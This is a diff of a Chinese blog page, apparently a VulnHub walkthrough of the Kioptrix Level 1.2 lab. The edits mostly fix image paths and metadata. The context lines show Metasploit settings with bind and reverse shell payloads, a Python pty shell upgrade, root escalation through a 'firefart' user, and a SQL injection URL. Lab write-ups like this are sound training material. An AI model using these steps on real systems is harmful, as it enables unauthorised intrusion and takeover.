@@ -17,15 +17,15 @@
 <meta property="og:site_name" content="zhou">
 <meta property="og:description" content="镜像地址：kioptrix level1.2">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-2/kioptrix-level1-2/1.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-2/kioptrix-level1-2/2.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-2/kioptrix-level1-2/3.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-2/1.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-2/2.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-2/3.png">
 <meta property="article:published_time" content="2024-09-07T07:33:38.000Z">
-<meta property="article:modified_time" content="2024-09-09T06:42:23.187Z">
+<meta property="article:modified_time" content="2024-09-08T06:13:08.787Z">
 <meta property="article:author" content="zhoupeng">
 <meta property="article:tag" content="VulnHub靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.zyp0422.mom/kioptrix-level1-2/kioptrix-level1-2/1.png">
+<meta name="twitter:image" content="https://blog.zyp0422.mom/kioptrix-level1-2/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -105,7 +105,7 @@
 			</ul>
 		</nav>
                                 <nav>
-    			总文章数 38
+    			总文章数 39
 		</nav>
 		<nav class="header-smart-menu">
 			
@@ -422,12 +422,12 @@
 
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">options</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/kioptrix-level1-2/kioptrix-level1-2/1.png"></p>
+<p><img src="/kioptrix-level1-2/1.png"></p>
 <p>其中yes是必须设置的参数</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 设置目标<span class="selector-tag">ip</span></span><br><span class="line"><span class="selector-tag">set</span> <span class="selector-tag">rhosts</span> <span class="number">192.168</span><span class="selector-class">.1</span><span class="selector-class">.180</span></span><br><span class="line"></span><br><span class="line"># 设置<span class="selector-tag">uri</span>，由于网站不存在/<span class="selector-tag">lcms</span>所以需要修改</span><br><span class="line"><span class="selector-tag">set</span> <span class="selector-tag">uri</span> /</span><br><span class="line"></span><br><span class="line"># 默认的<span class="selector-tag">payload</span>好像跑不成功，于是需要修改</span><br><span class="line"><span class="selector-tag">show</span> <span class="selector-tag">payloads</span> <span class="selector-tag">shell</span> # 查找可以使用的<span class="selector-tag">payloads</span></span><br><span class="line"><span class="selector-tag">set</span> <span class="selector-tag">generic</span>/<span class="selector-tag">shell_bind_tcp</span>  # 这是我使用的<span class="selector-tag">payload</span></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"><span class="selector-tag">set</span> <span class="selector-tag">payload</span> <span class="selector-tag">php</span>/<span class="selector-tag">reverse_perl</span></span><br><span class="line"><span class="selector-tag">set</span> <span class="selector-tag">payload</span> <span class="selector-tag">generic</span>/<span class="selector-tag">shell_bind_tcp</span></span><br><span class="line"><span class="selector-tag">set</span> <span class="selector-tag">payload</span> <span class="selector-tag">php</span>/<span class="selector-tag">bind_perl</span></span><br><span class="line"><span class="selector-tag">set</span> <span class="selector-tag">payload</span> <span class="selector-tag">php</span>/<span class="selector-tag">reverse_php</span></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
 
 <h6 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h6><p>运行获得shell</p>
-<p><img src="/kioptrix-level1-2/kioptrix-level1-2/2.png"></p>
+<p><img src="/kioptrix-level1-2/2.png"></p>
 <h6 id="python交互式终端"><a href="#python交互式终端" class="headerlink" title="python交互式终端"></a>python交互式终端</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">-c</span> &quot;<span class="selector-tag">import</span> <span class="selector-tag">pty</span>;<span class="selector-tag">pty</span><span class="selector-class">.spawn</span>(<span class="string">&#x27;/bin/bash&#x27;</span>)&quot;</span><br></pre></td></tr></table></figure>
 
 <h6 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h6><p>这里就直接展示命令了，详细看前两个level</p>
@@ -443,7 +443,7 @@
 
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">su</span> <span class="selector-tag">firefart</span></span><br><span class="line"></span><br><span class="line">输入设置的密码就可以获得<span class="selector-tag">root</span>权限了</span><br></pre></td></tr></table></figure>
 
-<p><img src="/kioptrix-level1-2/kioptrix-level1-2/3.png"></p>
+<p><img src="/kioptrix-level1-2/3.png"></p>
 <h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>网上的方法，我只是复现</p>
 <p>在下面的payload中存在sql注入漏洞</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=-1</span><br></pre></td></tr></table></figure>
